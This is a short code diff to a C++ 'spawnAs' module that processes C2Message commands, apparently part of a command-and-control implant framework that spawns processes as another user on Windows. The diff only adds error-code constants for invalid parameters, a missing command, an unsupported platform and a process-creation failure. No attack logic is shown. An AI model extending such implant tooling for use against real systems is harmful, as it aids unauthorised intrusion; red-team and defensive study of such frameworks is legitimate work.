@@ -119,6 +119,14 @@ namespace
 constexpr std::string_view moduleName = "spawnAs";
 constexpr unsigned long long moduleHash = djb2(moduleName);
 
+namespace
+{
+    constexpr int ERROR_INVALID_PARAMETERS = 1;
+    constexpr int ERROR_MISSING_COMMAND = 2;
+    constexpr int ERROR_UNSUPPORTED_PLATFORM = 3;
+    constexpr int ERROR_PROCESS_CREATION = 4;
+}
+
 
 #ifdef _WIN32
 
@@ -417,6 +425,7 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
     if (splitedList.size() < 3)
     {
         c2RetMessage.set_returnvalue("Invalid command parameters received.\n");
+        c2RetMessage.set_errorCode(ERROR_INVALID_PARAMETERS);
         return -1;
     }
 
@@ -431,6 +440,7 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
 #ifdef __linux__
 
     result = "Only supported on Windows.\n";
+    c2RetMessage.set_errorCode(ERROR_UNSUPPORTED_PLATFORM);
 
 #elif _WIN32
 
@@ -442,6 +452,7 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
     if (commandLineW.empty())
     {
         c2RetMessage.set_returnvalue("Missing command to execute.\n");
+        c2RetMessage.set_errorCode(ERROR_MISSING_COMMAND);
         return -1;
     }
 
@@ -680,6 +691,7 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
         c2RetMessage.set_instruction(c2RetMessage.instruction());
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
+        c2RetMessage.set_errorCode(ERROR_PROCESS_CREATION);
         return 0;
     }
 
